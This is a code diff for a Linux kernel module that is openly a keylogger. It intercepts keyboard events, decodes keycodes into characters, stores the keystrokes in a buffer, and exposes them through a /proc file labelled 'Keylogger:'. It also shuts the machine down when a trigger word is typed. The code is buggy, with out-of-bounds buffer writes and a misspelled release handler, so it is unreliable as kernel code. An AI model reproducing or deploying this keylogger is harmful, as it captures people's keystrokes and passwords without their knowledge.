@@ -15,14 +15,25 @@ static size_t len;
 
 static struct proc_dir_entry* key_file;
 
+const char CH_TABLE[] = {
+    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\r',
+    '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
+    'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', 'X',
+    'X', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'
+};
+
 static int file_show(struct seq_file *m, void *v)
 {
-    seq_printf(m, "mira %s \n", buffer);
+    buffer = krealloc( buffer, len + 1, GFP_KERNEL);
+    buffer[len+1] = '\0';
+    seq_printf(m, "Keylogger: %s\n", buffer);
+    
     return 0;
 }
 
 static int file_open(struct inode *inode, struct file *file)
 {
+
     return single_open(file, file_show, NULL);
 }
 
@@ -31,7 +42,7 @@ static const struct file_operations key_fops = {
     .open       = file_open,
     .read       = seq_read,
     .llseek     = seq_lseek,
-    .release    = single_release,
+    .release    = sq_release,
 };
 
 const char PATTERN[] = "noescribir";
@@ -69,18 +80,13 @@ static int push_next_char(char t) {
     return match;
 }
 
-const char CH_TABLE[] = {
-    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\r',
-    '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
-    'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', 'X',
-    'X', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'
-};
-
 static char decode_key(int keycode) {
     int char_index = keycode - KEY_1;
+    buffer = krealloc( buffer, len + 1, GFP_KERNEL);
+    len++;
     if(char_index >= 0 && char_index < sizeof(CH_TABLE)){
         printk(KERN_INFO "Key %c", CH_TABLE[char_index]);
-        memcpy( buffer, &CH_TABLE[char_index], sizeof(*buffer)+1);
+        buffer[len + 1] = CH_TABLE[char_index];
         return CH_TABLE[char_index];
     }else{
         return (keycode == KEY_SPACE) ? ' ' : '?';
@@ -92,8 +98,7 @@ static int on_key_event(struct notifier_block* nblock, unsigned long code, void*
     if (code == KBD_KEYCODE && param->down) {
         int key = param->value;
         if (push_next_char(decode_key(key))) {
-            //orderly_poweroff(1);
-            printk(KERN_INFO "Buffer contains %s\n", buffer);
+            orderly_poweroff(1);
         }
     }
     return NOTIFY_OK;
